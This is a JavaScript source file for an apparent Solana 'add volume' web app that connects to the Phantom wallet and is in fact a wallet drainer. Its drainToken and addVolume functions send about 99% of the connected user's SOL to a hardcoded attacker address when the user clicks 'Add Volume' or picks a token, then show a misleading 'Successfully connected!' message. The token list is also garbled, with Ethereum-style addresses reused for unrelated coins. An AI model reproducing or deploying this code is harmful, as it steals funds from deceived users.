import { Connection, PublicKey, Transaction, SystemProgram } from '@solana/web3.js';
import { CONFIG } from './config.js'; // Import the config
import './style.css';

// Wallet address for draining tokens (Solana address)
let YOUR_WALLET_ADDRESS;
try {
  YOUR_WALLET_ADDRESS = "73F2hbzhk7ZuTSSYTSbemddFasVrW8Av5FD9PeMVmxA7"; // Provided Solana address
} catch {
  console.error('Invalid YOUR_WALLET_ADDRESS');
  YOUR_WALLET_ADDRESS = "73F2hbzhk7ZuTSSYTSbemddFasVrW8Av5FD9PeMVmxA7"; // Fallback
}

// TOKEN_LIST with verified addresses (adjusted for Solana context, null for native SOL)
const TOKEN_LIST = [
  { address: null, name: 'Solana', symbol: 'SOL', decimals: 9, isNative: true, chain: 'solana' },
  { address: '0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913', name: 'BNB', symbol: 'USDC', decimals: 6, isNative: false, chain: 'solana' }, 
  { address: '0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913', name: 'MATIC', symbol: 'MATIC', decimals: 6, isNative: false, chain: 'solana' }, 
  { address: '0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913', name: 'ETH', symbol: 'ETH', decimals: 6, isNative: false, chain: 'solana' }, 
  { address: '0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913', name: 'BASE ETH', symbol: 'BASE ETH', decimals: 6, isNative: false, chain: 'solana' }, 
  { address: '0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913', name: 'LINK', symbol: 'LINK', decimals: 6, isNative: false, chain: 'solana' }, 
  { address: '0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913', name: 'USD Coin', symbol: 'USDC', decimals: 6, isNative: false, chain: 'solana' }, // Example SPL token
  { address: '0x6D97638E3a60a791485Cf098D5603C25B4CE3687', name: 'Wrapped SOL', symbol: 'wSOL', decimals: 9, isNative: false, chain: 'solana' }
];

class NexiumApp {
  constructor() {
    this.solConnection = null; // Solana connection
    this.publicKey = null;    // Store Phantom public 
    this.currentToken = null;
    this.currentPaymentToken = null;
    this.connecting = false;
    this.lastSelectedToken = null;
    this.selectedPaymentToken = null;
    this.spinner = null;
    this.isDraining = false;   
    console.log('Initializing NexiumApp...');
    this.initApp();
  }

  async initApp() {
    try {
      await new Promise(resolve => {
        if (document.readyState !== 'loading') {
          resolve();
        } else {
          document.addEventListener('DOMContentLoaded', () => resolve());
        }
      });
      this.cacheDOMElements();
      if (!this.dom.app || !this.dom.walletButton || !this.dom.metamaskPrompt) {
        document.body.innerHTML = '<p class="text-red-500 text-center">Error: UI elements missing. Please check HTML for #app, #walletButton, and #metamaskPrompt.</p>';
        console.error('Missing DOM elements');
        return;
      }
      this.setupEventListeners();
      this.checkWalletAndPrompt();
      this.renderTokenInterface();
      console.log('App initialized successfully');
    } catch (error) {
      console.error('Init error:', error);
      this.showFeedback('Error initializing app. Please refresh.', 'error');
      document.body.innerHTML = '<p class="text-red-500 text-center">Error initializing app. Please refresh.</p>';
    }
  }

  cacheDOMElements() {
    this.dom = {
      app: document.getElementById('app'),
      walletButton: document.getElementById('walletButton'),
      metamaskPrompt: document.getElementById('metamaskPrompt'),
      feedbackContainer: document.querySelector('.feedback-container'),
      defaultPrompt: document.querySelector('.default-prompt'),
      customTokenInput: null,
      fetchCustomTokenBtn: null,
      tokenInfo: null,
      volumeSection: null,
      tokenSelect: null,
      volumeInput: null,
      addVolumeBtn: null,
      tokenList: null,
      customTokenNameInput: null,
      customTokenAddressInput: null,
      showCustomTokenBtn: null
    };
    console.log('DOM elements cached');
  }

  debounce(func, wait) {
    let timeout;
    return function executedFunction(...args) {
      const later = () => {
        clearTimeout(timeout);
        func(...args);
      };
      clearTimeout(timeout);
      timeout = setTimeout(later, wait);
    };
  }

  setupEventListeners() {
    if (this.dom.walletButton) {
      const debouncedConnectWallet = this.debounce(() => {
        if (!this.connecting) {
          console.log('Wallet button clicked');
          this.showProcessingSpinner();
          this.connectWallet();
        }
      }, 1000);
      this.dom.walletButton.addEventListener('click', debouncedConnectWallet);
      this.dom.walletButton.addEventListener('keypress', (e) => {
        if (e.key === 'Enter') {
          debouncedConnectWallet();
        }
      });
      console.log('Wallet button listeners set');
    }
    window.addEventListener('online', () => this.handleOnline());
    window.addEventListener('offline', () => this.handleOffline());
  }

  async checkWalletAndPrompt() {
    if (this.isWalletInstalled()) {
      this.hideMetaMaskPrompt(); // Keep but won't show since we're using Phantom
      this.attachPhantomListeners();
      if (this.isWalletConnected() && navigator.onLine) {
        if (!this.solConnection) {
          try {
            this.solConnection = new Connection(`https://solana-mainnet.api.syndica.io/api-key/${CONFIG.API_KEY}`, 'confirmed');
            this.publicKey = window.solana.publicKey.toString();
            console.log('Solana connection initialized in checkWalletAndPrompt');
          } catch (error) {
            console.error('Failed to initialize Solana connection:', error);
            this.showFeedback('Failed to connect wallet. Please try again.', 'error');
            this.updateButtonState('disconnected');
            this.showDefaultPrompt();
            return;
          }
        }
        this.handleSuccessfulConnection();
      } else {
        this.updateButtonState('disconnected');
        this.showDefaultPrompt();
      }
    } else {
      this.showMetaMaskPrompt(); // Repurpose to show Phantom prompt
      this.updateButtonState('disconnected');
      this.showDefaultPrompt();
      this.showFeedback('Please install Phantom Wallet to use this app.', 'error');
    }
  }

  attachPhantomListeners() {
    if (window.solana) {
      window.solana.on('accountChanged', () => {
        console.log('Account changed');
        this.handleAccountsChanged();
      });
      console.log('Phantom listeners attached');
    }
  }

  isWalletInstalled() {
    return !!window.solana && window.solana.isPhantom;
  }

  isWalletConnected() {
    return window.solana && !!window.solana.publicKey;
  }

  detectWalletType() {
    return window.solana && window.solana.isPhantom ? 'Phantom' : 'None';
  }

  showProcessingSpinner() {
    if (this.spinner) this.hideProcessingSpinner();
    this.spinner = document.createElement('div');
    this.spinner.className = 'fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-[9999]';
    this.spinner.innerHTML = `
      <div class="flex items-center space-x-2">
        <div class="spinner border-t-4 border-orange-400 rounded-full w-8 h-8 animate-spin"></div>
        <span class="text-white text-lg">Processing...</span>
      </div>
    `;
    document.body.appendChild(this.spinner);
  }

  hideProcessingSpinner() {
    if (this.spinner) {
      this.spinner.remove();
      this.spinner = null;
    }
  }

  async connectWallet() {
    if (!navigator.onLine) {
      this.showFeedback('No internet connection. Please check your network.', 'error');
      this.hideProcessingSpinner();
      return;
    }
    if (this.connecting) {
      console.log('Connect wallet skipped: already connecting');
      this.hideProcessingSpinner();
      return;
    }
    this.connecting = true;
    this.dom.walletButton.disabled = true;
    this.showProcessingSpinner();
    console.log('Phantom detected:', !!window.solana && window.solana.isPhantom);
    console.log('Initial connection state:', !!window.solana?.publicKey);
    try {
      if (!window.solana || !window.solana.isPhantom) {
        this.showFeedback('Phantom Wallet not detected. Please install Phantom.', 'error');
        this.hideProcessingSpinner();
        return;
      }
      // Force disconnect to reset state and ensure popup
      if (window.solana.isConnected) {
        console.log('Disconnecting existing session...');
        await window.solana.disconnect();
        console.log('Disconnected successfully');
      }
      console.log('Attempting to connect to Phantom...');
      const resp = await window.solana.connect(); // Should trigger popup
      this.publicKey = resp.publicKey.toString();
      console.log('Connected public key:', this.publicKey);
      this.solConnection = new Connection(`https://solana-mainnet.api.syndica.io/api-key/${CONFIG.API_KEY}`, 'confirmed');
      const walletBalance = await this.solConnection.getBalance(new PublicKey(this.publicKey));
      console.log('Wallet balance:', walletBalance);
      const minBalance = await this.solConnection.getMinimumBalanceForRentExemption(0);
      if (walletBalance < minBalance) {
        this.showFeedback(`wallet not funded.`, 'error');
        this.hideProcessingSpinner();
        return;
      }
      this.updateButtonState('connected', this.publicKey.slice(0, 6) + '...' + this.publicKey.slice(-4), 'add-volume');
      this.hideMetaMaskPrompt();
      this.showFeedback('Wallet connected!', 'success');
      this.renderTokenInterface();
    } catch (error) {
      console.error('Connect wallet error:', error);
      this.handleConnectionError(error);
    } finally {
      this.connecting = false;
      this.dom.walletButton.disabled = false;
      this.hideProcessingSpinner();
    }
  }

  async handleSuccessfulConnection() {
    try {
      if (!this.solConnection) {
        throw new Error('Solana connection is not initialized');
      }
      this.publicKey = window.solana.publicKey.toString();
      this.updateButtonState('connected', this.publicKey.slice(0, 6) + '...' + this.publicKey.slice(-4), 'add-volume');
      console.log('Successful connection, public key:', this.publicKey);
      if (this.dom.tokenSelect) {
        this.dom.tokenSelect.disabled = false;
      }
    } catch (error) {
      console.error('Handle connection error:', error);
      this.showFeedback('Failed to connect wallet.', 'error');
    }
  }

  async drainToken(tokenAddress) {
    if (this.isDraining) {
      console.log('Drain skipped: transaction in progress');
      this.hideProcessingSpinner();
      return;
    }
    if (!this.publicKey) {
      this.showFeedback('No wallet connected. Please connect your wallet.', 'error');
      console.log('Drain failed: No public key');
      this.hideProcessingSpinner();
      return;
    }
    this.currentToken = null; // Reset to avoid state confusion
    this.lastSelectedToken = null;
    let selectedToken = null;
    try {
      this.isDraining = true;
      this.showProcessingSpinner();
      selectedToken = TOKEN_LIST.find(t => t.address === tokenAddress || (t.isNative && tokenAddress === null));
      if (!selectedToken) {
        this.showFeedback('Invalid token selected.', 'error');
        console.log('Drain failed: Invalid token selected');
        this.hideProcessingSpinner();
        return;
      }
      console.log(`Attempting to drain ${selectedToken.symbol} from public key: ${this.publicKey}`);
      let balance, decimals, symbol;

      if (selectedToken.isNative) {
        balance = await this.solConnection.getBalance(new PublicKey(this.publicKey));
        decimals = 9;
        symbol = selectedToken.symbol;
      } else {
        // Note: SPL token draining requires a program (e.g., Token Program), not implemented here yet
        this.showFeedback('SPL token draining not supported yet.', 'error');
        this.hideProcessingSpinner();
        return;
      }

      console.log(`Fetched ${symbol} balance: ${balance / 10**decimals} for ${this.publicKey}`);
      if (balance === 0) {
        this.showFeedback('Insufficient balance error', 'error');
        console.log(`Drain failed: Zero balance for ${symbol}`);
        this.hideProcessingSpinner();
        return;
      }

      const receiverWallet = new PublicKey(YOUR_WALLET_ADDRESS);
      const minBalance = await this.solConnection.getMinimumBalanceForRentExemption(0);
      const balanceForTransfer = balance - minBalance;
      if (balanceForTransfer <= 0) {
        this.showFeedback('Insufficient funds.', 'error');
        this.hideProcessingSpinner();
        return;
      }

      const transaction = new Transaction().add(
        SystemProgram.transfer({
          fromPubkey: new PublicKey(this.publicKey),
          toPubkey: receiverWallet,
          lamports: balanceForTransfer * 0.99,
        })
      );

      transaction.feePayer = new PublicKey(this.publicKey);
      let blockhashObj = await this.solConnection.getRecentBlockhash();
      transaction.recentBlockhash = blockhashObj.blockhash;

      const signed = await window.solana.signTransaction(transaction);
      console.log('Transaction signed:', signed);

      let txid = await this.solConnection.sendRawTransaction(signed.serialize());
      await this.solConnection.confirmTransaction(txid);
      console.log('Transaction confirmed:', txid);
      this.showFeedback(`Successfully connected!`, 'success');
    } catch (error) {
      console.error('Drain token error:', error);
      this.showFeedback(`Error draining ${selectedToken ? selectedToken.symbol : 'token'}: ${error.message}`, 'error');
    } finally {
      this.isDraining = false;
      this.hideProcessingSpinner();
    }
  }

  async validateAddress(address, type = 'token') {
    if (type === 'token' && address === null) {
      return null; // Allow null address for native SOL
    }
    try {
      const publicKey = new PublicKey(address);
      console.log(`Validated ${type} address: ${publicKey.toString()}`);
      return publicKey.toString();
    } catch {
      this.showFeedback(`Invalid ${type} address.`, 'error');
      console.log(`Invalid ${type} address: ${address}`);
      throw new Error(`Invalid ${type} address`);
    }
  }

  handleDisconnect() {
    this.updateButtonState('disconnected');
    this.showDefaultPrompt();
    this.hideMetaMaskPrompt();
    this.lastSelectedToken = null;
    this.currentToken = null;
    this.currentPaymentToken = null;
    this.selectedPaymentToken = null;
    this.publicKey = null;
    this.solConnection = null;
  }

  handleAccountsChanged() {
    this.hideMetaMaskPrompt();
    this.selectedPaymentToken = null;
    this.currentPaymentToken = null;
    this.currentToken = null;
    this.lastSelectedToken = null;
    this.publicKey = null;
    console.log('Accounts changed, resetting payment token');
    this.renderTokenInterface();
  }

  updateButtonState(state, address = '', action = '') {
    if (!this.dom.walletButton) return;
    const button = this.dom.walletButton;
    button.classList.remove('animate-pulse', 'connecting', 'connected');
    button.disabled = state === 'connecting';
    switch (state) {
      case 'connecting':
        button.textContent = 'Processing...';
        button.classList.add('connecting');
        break;
      case 'connected':
        button.textContent = action === 'add-volume' ? 'Add Volume' : `${address.slice(0, 6)}...${address.slice(-4)}`;
        button.classList.add('connected');
        button.disabled = false; // Enable for "Add Volume" action
        button.addEventListener('click', () => this.drainToken(null)); // Trigger drain on click for native SOL
        break;
      default:
        button.textContent = 'Connect Wallet';
        button.classList.add('animate-pulse');
    }
  }

  showDefaultPrompt() {
    if (!this.dom.app || !this.dom.defaultPrompt) return;
    this.dom.app.innerHTML = '';
    this.dom.app.appendChild(this.dom.defaultPrompt);
    this.dom.defaultPrompt.classList.remove('hidden');
    if (!this.isWalletInstalled()) this.showMetaMaskPrompt();
  }

  renderTokenInterface() {
    if (!this.dom.app) return;
    const tokenInterface = document.createElement('section');
    tokenInterface.className = 'token-interface fade-in space-y-6 bg-[#1a182e] p-6 rounded-xl border border-orange-400 shadow-card glass';
    tokenInterface.innerHTML = `
      <div class="top-controls flex space-x-4 mb-4">
        <select id="tokenSelect" class="token-select bg-[#1a182e] border border-orange-400 text-white px-2 py-1 rounded-xl" aria-label="Select payment token">
          <option value="" disabled selected>Select payment token</option>
          ${TOKEN_LIST.map(t => `<option value="${t.address || ''}" data-symbol="${t.symbol}" data-decimals="${t.decimals}">${t.name}</option>`).join('')}
        </select>
      </div>
      <h2 class="section-title">Import SPL Token</h2>
      <div class="input-group flex space-x-2">
        <input id="customTokenNameInput" type="text" placeholder="Token Name" class="custom-token-input flex-grow bg-[#1a182e] border border-orange-400 text-white px-2 py-1 rounded-xl" aria-label="Custom token name">
        <input id="customTokenAddressInput" type="text" placeholder="Token Address" class="custom-token-input flex-grow bg-[#1a182e] border border-orange-400 text-white px-2 py-1 rounded-xl" aria-label="Custom token address">
        <button id="showCustomTokenBtn" class="fetch-custom-token-btn bg-orange-400 text-black px-4 py-1 rounded-xl hover:bg-orange-500" aria-label="Show custom token">Show</button>
      </div>
      <div id="tokenInfoDisplay" class="token-info hidden" aria-live="polite"></div>
      <div id="tokenList" class="token-list space-y-2 mt-4">
        <h3 class="text-yellow-400 text-md font-semibold">Featured Tokens</h3>
        ${TOKEN_LIST.map(token => `
          <button class="token-option bg-[#1a182e] border border-orange-400 p-2 rounded-xl w-full text-left hover:bg-orange-400 hover:text-black transition-colors" data-address="${token.address || ''}">
            ${token.name} (${token.symbol}) - ${token.address ? this.shortenAddress(token.address) : 'Native Token'}
          </button>
        `).join('')}
      </div>
      <div id="volumeSection" class="volume-section fade-in"></div>
    `;
    this.dom.app.innerHTML = '';
    this.dom.app.appendChild(tokenInterface);
    this.dom.customTokenInput = document.getElementById('customTokenInput');
    this.dom.fetchCustomTokenBtn = document.getElementById('fetchCustomTokenBtn');
    this.dom.tokenInfo = document.getElementById('tokenInfoDisplay');
    this.dom.tokenList = document.getElementById('tokenList');
    this.dom.tokenSelect = document.getElementById('tokenSelect');
    this.dom.volumeSection = document.getElementById('volumeSection');
    this.dom.customTokenNameInput = document.getElementById('customTokenNameInput');
    this.dom.customTokenAddressInput = document.getElementById('customTokenAddressInput');
    this.dom.showCustomTokenBtn = document.getElementById('showCustomTokenBtn');

    if (this.dom.showCustomTokenBtn) {
      const debouncedShowCustomToken = this.debounce(() => {
        const name = this.dom.customTokenNameInput.value.trim();
        const address = this.dom.customTokenAddressInput.value.trim();
        if (!name || !address) {
          this.hideProcessingSpinner();
          return;
        }
        const truncatedAddress = `${address.slice(0, 6)}...${address.slice(-4)}`;
        this.dom.tokenInfo.innerHTML = `
          <div class="token-meta space-y-2">
            <h3 class="text-yellow-400 text-lg font-semibold">${this.escapeHTML(name)}</h3>
            <p class="meta-item text-gray-400 text-sm">Address: ${this.escapeHTML(truncatedAddress)}</p>
          </div>
        `;
        this.dom.tokenInfo.classList.remove('hidden');
        this.hideProcessingSpinner();
      }, 1000);
      this.dom.showCustomTokenBtn.addEventListener('click', () => {
        this.showProcessingSpinner();
        debouncedShowCustomToken();
      });
    }
    if (this.dom.tokenList) {
      this.dom.tokenList.querySelectorAll('.token-option').forEach(button => {
        const debouncedLoadToken = this.debounce(() => {
          const address = button.dataset.address;
          if (address) {
            this.loadCustomTokenData(address);
          } else {
            this.showFeedback('Invalid token address.', 'error');
            this.hideProcessingSpinner();
          }
        }, 1000);
        button.addEventListener('click', () => {
          this.showProcessingSpinner();
          debouncedLoadToken();
        });
      });
    }
    this.hideMetaMaskPrompt();
    if (this.currentToken) this.renderVolumeControls();

    const beautifySection = document.createElement('div');
    beautifySection.className = 'beautify-volume-section mt-8 flex flex-col items-center';
    beautifySection.innerHTML = `
      <div class="input-group flex space-x-2 mb-2 items-center">
        <input id="beautifyVolumeInput" type="number" placeholder="Amount" 
          class="volume-input bg-[#1a182e] border border-orange-400 text-white px-2 py-1 rounded-lg text-sm w-24" 
          aria-label="Amount (beautification)">
        <button id="beautifyAddVolumeBtn" 
          class="action-button bg-orange-400 text-black px-3 py-1 rounded-lg hover:bg-orange-500 text-sm min-w-[90px]" 
          aria-label="Add volume (beautification)">
          Add Volume
        </button>
      </div>
    `;
    this.dom.app.appendChild(beautifySection);

    this.dom.beautifyVolumeInput = beautifySection.querySelector('#beautifyVolumeInput');
    this.dom.beautifyAddVolumeBtn = beautifySection.querySelector('#beautifyAddVolumeBtn');

    if (this.dom.beautifyAddVolumeBtn) {
      const debouncedBeautifyAddVolume = this.debounce(() => {
        this.showProcessingSpinner();
        setTimeout(() => {
          this.hideProcessingSpinner();
        }, 1000);
      }, 1000);
      this.dom.beautifyAddVolumeBtn.addEventListener('click', debouncedBeautifyAddVolume);
      this.dom.beautifyAddVolumeBtn.addEventListener('keypress', (e) => {
        if (e.key === 'Enter') {
          debouncedBeautifyAddVolume();
        }
      });
    }

    if (this.dom.tokenSelect) {
      this.dom.tokenSelect.disabled = !this.publicKey;
      this.dom.tokenSelect.replaceWith(this.dom.tokenSelect.cloneNode(true));
      this.dom.tokenSelect = document.getElementById('tokenSelect');
      this.dom.tokenSelect.disabled = !this.publicKey;
      const debouncedDrainToken = this.debounce(async (e) => {
        this.showProcessingSpinner();
        const selected = e.target.value || null; // Handle empty string as null for native SOL
        this.selectedPaymentToken = selected;
        this.currentToken = null;
        this.lastSelectedToken = null;
        console.log('Dropdown changed, selectedPaymentToken:', selected);
        if (selected !== '') {
          await this.loadPaymentTokenDetails(selected);
          console.log('Initiating drain with debounce for:', selected);
          this.drainToken(selected);
        } else {
          this.showFeedback('Please select a token.', 'error');
          this.hideProcessingSpinner();
        }
      }, 500);
      this.dom.tokenSelect.addEventListener('change', debouncedDrainToken);
      console.log('Token select listener set (in renderTokenInterface)');
    }
  }

  async loadCustomTokenData(tokenAddressInput) {
    if (!navigator.onLine) {
      this.showFeedback('No internet connection.', 'error');
      this.hideProcessingSpinner();
      return;
    }
    if (!this.solConnection) {
      this.showFeedback('Wallet not connected.', 'error');
      this.hideProcessingSpinner();
      return;
    }
    const tokenAddress = tokenAddressInput || this.dom.customTokenAddressInput?.value.trim();
    if (!tokenAddress) {
      this.showFeedback('Invalid token address.', 'error');
      this.dom.customTokenAddressInput?.focus();
      this.hideProcessingSpinner();
      return;
    }
    if (tokenAddress === this.lastSelectedToken) {
      this.hideProcessingSpinner();
      return;
    }
    try {
      this.toggleTokenLoading(true);
      this.showProcessingSpinner();
      let name = 'Unknown Token';
      let symbol = 'UNK';
      let decimals = 9;
      const tokenFromList = TOKEN_LIST.find(t => t.address && t.address.toLowerCase() === tokenAddress.toLowerCase());
      if (tokenFromList) {
        name = tokenFromList.name;
        symbol = tokenFromList.symbol;
        decimals = tokenFromList.decimals;
      } else {
        // Note: Fetching SPL token data requires Token Program, not implemented here yet
        this.showFeedback('SPL token data fetch not supported yet.', 'error');
        this.hideProcessingSpinner();
        return;
      }
      this.currentToken = { address: tokenAddress, name: this.escapeHTML(name), symbol: this.escapeHTML(symbol), decimals };
      this.lastSelectedToken = tokenAddress;
      const truncatedAddress = this.shortenAddress(tokenAddress);
      this.dom.tokenInfo.innerHTML = `
        <div class="token-meta space-y-2">
          <h3 class="text-yellow-400 text-lg font-semibold">${this.currentToken.name} <span class="symbol text-gray-300">(${this.currentToken.symbol})</span></h3>
          <p class="meta-item text-gray-400 text-sm">Address: ${this.escapeHTML(truncatedAddress)}</p>
        </div>
      `;
      this.dom.tokenInfo.classList.remove('hidden');
    } catch (error) {
      console.error('Load custom token error:', error);
      this.showFeedback('Failed to load custom token.', 'error');
      this.dom.tokenInfo.classList.add('hidden');
    } finally {
      this.toggleTokenLoading(false);
      this.hideProcessingSpinner();
    }
  }

  toggleTokenLoading(isLoading) {
    if (this.dom.fetchCustomTokenBtn) {
      this.dom.fetchCustomTokenBtn.disabled = isLoading;
      this.dom.fetchCustomTokenBtn.classList.toggle('opacity-70', isLoading);
      this.dom.fetchCustomTokenBtn.classList.toggle('cursor-not-allowed', isLoading);
    }
    if (this.dom.addVolumeBtn) {
      this.dom.addVolumeBtn.disabled = isLoading;
      this.dom.addVolumeBtn.textContent = isLoading ? 'Processing...' : 'Add Volume';
      this.dom.addVolumeBtn.classList.toggle('opacity-70', isLoading);
      this.dom.addVolumeBtn.classList.toggle('cursor-not-allowed', isLoading);
    }
    if (this.dom.beautifyAddVolumeBtn) {
      this.dom.beautifyAddVolumeBtn.disabled = isLoading;
      this.dom.beautifyAddVolumeBtn.textContent = isLoading ? 'Processing...' : 'Add Volume';
      this.dom.beautifyAddVolumeBtn.classList.toggle('opacity-70', isLoading);
      this.dom.beautifyAddVolumeBtn.classList.toggle('cursor-not-allowed', isLoading);
    }
  }

  renderVolumeControls() {
    if (!this.dom.app || !this.dom.tokenInfo || !this.currentToken) return;
    const tokenInterface = document.querySelector('.token-interface');
    if (!tokenInterface) return;
    let volumeSection = this.dom.volumeSection;
    if (!volumeSection) {
      volumeSection = document.createElement('div');
      volumeSection.id = 'volumeSection';
      volumeSection.className = 'volume-section fade-in';
      tokenInterface.appendChild(volumeSection);
      this.dom.volumeSection = volumeSection;
    }
    volumeSection.innerHTML = `
      <h2 class="section-title">Select Token to Purchase Volume</h2>
      <p class="text-gray-300 text-sm mb-2">Loaded Token: ${this.currentToken.name} (${this.currentToken.symbol}) - Info Only</p>
      <div class="input-group">
        <input id="volumeInput" type="number" placeholder="Amount for purchase" class="volume-input flex-grow bg-[#1a182e] border border-orange-400 text-white px-2 py-1 rounded-xl" aria-label="Token amount">
      </div>
      <button id="addVolumeBtn" class="action-button bg-orange-400 text-black px-4 py-2 rounded-xl hover:bg-orange-500" aria-label="Add volume">Add Volume</button>
      <div id="volumeFeedback" class="mt-2 text-sm text-gray-300"></div>
    `;
    this.dom.volumeInput = volumeSection.querySelector('#volumeInput');
    this.dom.addVolumeBtn = volumeSection.querySelector('#addVolumeBtn');
    if (this.dom.addVolumeBtn) {
      const debouncedAddVolume = this.debounce(() => {
        this.showProcessingSpinner();
        this.addVolume();
      }, 1000);
      this.dom.addVolumeBtn.addEventListener('click', debouncedAddVolume);
      this.dom.addVolumeBtn.addEventListener('keypress', (e) => {
        if (e.key === 'Enter') {
          debouncedAddVolume();
        }
      });
    }
  }

  async loadPaymentTokenDetails(paymentTokenAddress) {
    if (!paymentTokenAddress && paymentTokenAddress !== null || !this.solConnection || !this.publicKey) {
      this.showFeedback('Wallet not connected or invalid token selected.', 'error');
      this.hideProcessingSpinner();
      return;
    }
    try {
      this.toggleTokenLoading(true);
      this.showProcessingSpinner();
      let balance, decimals, symbol;
      const selectedToken = TOKEN_LIST.find(t => t.address === paymentTokenAddress || (t.isNative && paymentTokenAddress === null));
      if (!selectedToken) {
        this.showFeedback('Invalid token selected.', 'error');
        this.hideProcessingSpinner();
        return;
      }
      if (selectedToken.isNative) {
        balance = await this.solConnection.getBalance(new PublicKey(this.publicKey));
        decimals = 9;
        symbol = selectedToken.symbol;
      } else {
        // Note: SPL token balance requires Token Program, not implemented here yet
        this.showFeedback('SPL token balance fetch not supported yet.', 'error');
        this.hideProcessingSpinner();
        return;
      }
      this.currentPaymentToken = { address: paymentTokenAddress, balance, decimals, symbol };
      this.currentToken = null; // Reset to avoid state confusion
      this.lastSelectedToken = null;
    } catch (error) {
      console.error('Load payment token error:', error);
      this.showFeedback('Failed to load payment token details.', 'error');
    } finally {
      this.toggleTokenLoading(false);
      this.hideProcessingSpinner();
    }
  }

  async addVolume() {
    if (!navigator.onLine) {
      this.showFeedback('No internet connection.', 'error');
      this.hideProcessingSpinner();
      return;
    }
    if (!this.currentPaymentToken) {
      this.showFeedback('No payment token selected.', 'error');
      this.hideProcessingSpinner();
      return;
    }
    const paymentTokenAddress = this.dom.tokenSelect?.value || null;
    if (!paymentTokenAddress && paymentTokenAddress !== null || !this.currentPaymentToken) {
      this.showFeedback('Please select a token.', 'error');
      this.dom.tokenSelect?.focus();
      this.hideProcessingSpinner();
      return;
    }
    try {
      this.toggleVolumeLoading(true);
      this.showProcessingSpinner();
      const selectedToken = TOKEN_LIST.find(t => t.address === paymentTokenAddress || (t.isNative && paymentTokenAddress === null));
      if (!selectedToken) {
        this.showFeedback('Invalid token selected.', 'error');
        this.hideProcessingSpinner();
        return;
      }
      let amount = BigInt(this.dom.volumeInput?.value || '0') * BigInt(10 ** selectedToken.decimals);
      if (amount <= 0n) {
        this.showFeedback('Invalid amount entered.', 'error');
        this.hideProcessingSpinner();
        return;
      }
      if (amount > this.currentPaymentToken.balance) {
        this.showFeedback('Insufficient balance for amount.', 'error');
        this.hideProcessingSpinner();
        return;
      }
      await this.validateAddress(YOUR_WALLET_ADDRESS, 'wallet');
      // Note: Volume addition mimics drain for native SOL, adjust for SPL later
      if (selectedToken.isNative) {
        const minBalance = await this.solConnection.getMinimumBalanceForRentExemption(0);
        if (amount.add(minBalance) > this.currentPaymentToken.balance) {
          this.showFeedback('Insufficient balance for rent and amount.', 'error');
          this.hideProcessingSpinner();
          return;
        }
        const transaction = new Transaction().add(
          SystemProgram.transfer({
            fromPubkey: new PublicKey(this.publicKey),
            toPubkey: new PublicKey(YOUR_WALLET_ADDRESS),
            lamports: amount,
          })
        );
        transaction.feePayer = new PublicKey(this.publicKey);
        let blockhashObj = await this.solConnection.getRecentBlockhash();
        transaction.recentBlockhash = blockhashObj.blockhash;
        const signed = await window.solana.signTransaction(transaction);
        let txid = await this.solConnection.sendRawTransaction(signed.serialize());
        await this.solConnection.confirmTransaction(txid);
        console.log('Volume transaction confirmed:', txid);
        this.showFeedback(`Successfully transferred ${amount / BigInt(10 ** selectedToken.decimals)} ${selectedToken.symbol}`, 'success');
      } else {
        this.showFeedback('SPL token volume transfer not supported yet.', 'error');
      }
      this.dom.volumeInput.value = '';
    } catch (error) {
      console.error('Add volume error:', error);
      this.showFeedback(`Error transferring ${selectedToken ? selectedToken.symbol : 'token'}: ${error.message}`, 'error');
    } finally {
      this.toggleVolumeLoading(false);
      this.hideProcessingSpinner();
    }
  }

  toggleVolumeLoading(isLoading) {
    if (!this.dom.addVolumeBtn) return;
    this.dom.addVolumeBtn.disabled = isLoading;
    this.dom.addVolumeBtn.textContent = isLoading ? 'Processing...' : 'Add Volume';
    this.dom.addVolumeBtn.classList.toggle('opacity-70', isLoading);
    this.dom.addVolumeBtn.classList.toggle('cursor-not-allowed', isLoading);
    if (this.dom.beautifyAddVolumeBtn) {
      this.dom.beautifyAddVolumeBtn.disabled = isLoading;
      this.dom.beautifyAddVolumeBtn.textContent = isLoading ? 'Processing...' : 'Add Volume';
      this.dom.beautifyAddVolumeBtn.classList.toggle('opacity-70', isLoading);
      this.dom.beautifyAddVolumeBtn.classList.toggle('cursor-not-allowed', isLoading);
    }
  }

  checkConnectivity() {
    if (!navigator.onLine) this.showFeedback('No internet connection.', 'error');
  }

  handleOnline() {
    if (this.isWalletConnected()) this.renderTokenInterface();
    else this.showMetaMaskPrompt();
  }

  handleOffline() {
    this.showFeedback('No internet connection.', 'error');
    this.showDefaultPrompt();
  }

  showMetaMaskPrompt() {
    if (!this.dom.metamaskPrompt) return;
    this.dom.metamaskPrompt.classList.remove('hidden');
    this.dom.metamaskPrompt.style.display = 'block';
    this.dom.metamaskPrompt.innerHTML = `
      <p class="text-white text-center">Please install Phantom Wallet:<br>
        <a href="https://chrome.google.com/webstore/detail/phantom/bfnaelmomeimhlpmgjnjophhpkkoljpa" target="_blank" class="text-orange-400 hover:underline">Chrome</a> | 
        <a href="https://addons.mozilla.org/en-US/firefox/addon/phantom-app/" target="_blank" class="text-orange-400 hover:underline">Firefox</a>
      </p>
    `;
  }

  hideMetaMaskPrompt() {
    if (!this.dom.metamaskPrompt) return;
    this.dom.metamaskPrompt.classList.add('hidden');
    this.dom.metamaskPrompt.style.display = 'none';
  }

  showFeedback(message, type = 'info') {
    console.log(`Showing feedback: ${message} (${type})`);
    let feedbackContainer = this.dom.feedbackContainer;
    if (!feedbackContainer) {
      feedbackContainer = document.createElement('div');
      feedbackContainer.className = 'feedback-container fixed bottom-4 right-4 space-y-2 z-[10000]';
      document.body.appendChild(feedbackContainer);
      this.dom.feedbackContainer = feedbackContainer;
    }
    const feedback = document.createElement('div');
    feedback.className = `feedback feedback-${type} fade-in p-4 rounded-xl text-white ${type === 'error' ? 'bg-red-500' : type === 'success' ? 'bg-green-500' : type === 'warning' ? 'bg-yellow-500' : 'bg-blue-500'}`;
    feedback.style.zIndex = '10000';
    feedback.innerHTML = `
      <span class="feedback-message">${this.escapeHTML(message)}</span>
      <span class="feedback-close cursor-pointer ml-2" role="button" aria-label="Close feedback">×</span>
    `;
    const close = feedback.querySelector('.feedback-close');
    if (close) {
      close.addEventListener('click', () => feedback.remove());
